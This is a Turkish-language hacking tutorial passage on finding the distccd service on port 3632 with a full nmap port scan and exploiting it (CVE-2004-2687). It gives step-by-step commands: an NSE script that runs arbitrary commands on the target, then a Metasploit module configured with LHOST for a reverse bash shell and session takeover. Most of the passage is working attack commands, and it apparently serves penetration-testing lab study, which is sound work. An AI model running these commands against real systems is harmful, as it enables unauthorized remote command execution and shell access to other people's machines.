- Bazen her türlü kombinasyonla yapılan taramalar açık bulmada yetersiz kalabilir.  
- Böyle durumlarda **tüm portlar** taranarak sık kullanılmayan bir portta açık bulunabilir.  

```bash
nmap <target ip> -p- -A
```

- Bu taramada daha fazla açık ortaya çıkabilir.  
- Örneğin: **3632 portunda çalışan distccd**.  
- distccd, C++ kodlarını compile etmede kullanılan bir programdır ve belirli sürümlerinde açık bulunur.  

---

## 📝 Script ile Exploit Etmek

- İnternette araştırıldığında bu açık için hazırlanmış bir **Nmap NSE scripti** olduğu görülür.  
- Örneğin:

```bash
nmap -p 3632 <target ip> --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='id'"
```

- Bu komut hedef sunucunun terminaline erişim sağlar.  
- `id` yerine istediğimiz komutu verebiliriz. Örnekler:  

```bash
nmap -p 3632 <target ip> --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='pwd'"
nmap -p 3632 <target ip> --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='ls'"
```

---

## 💣 Metasploit Modülü ile Exploit Etmek

- distccd açığı için **Metasploit modülü** de mevcuttur.  
- Bunun için:  

```bash
msfconsole
search distcc
use <modül adı>
show options
set RHOSTS <target ip>
set RPORT 3632
set LHOST <kendi ip>
exploit -j -z
```

- Eğer saldırı başarısız olursa genelde sebep:  
  ```
  no payload configured, defaulting to cmd/unix/reverse_bash
  ```
  uyarısıdır.  

- Bu durumda alternatif payload denenir:  

```bash
show payloads
set payload <seçilen payload>
exploit -j -z
```

- Saldırı başarılı olursa:  

```bash
sessions -l
sessions 1
```

- Artık hedef makineye erişim sağlanmış olur ✅
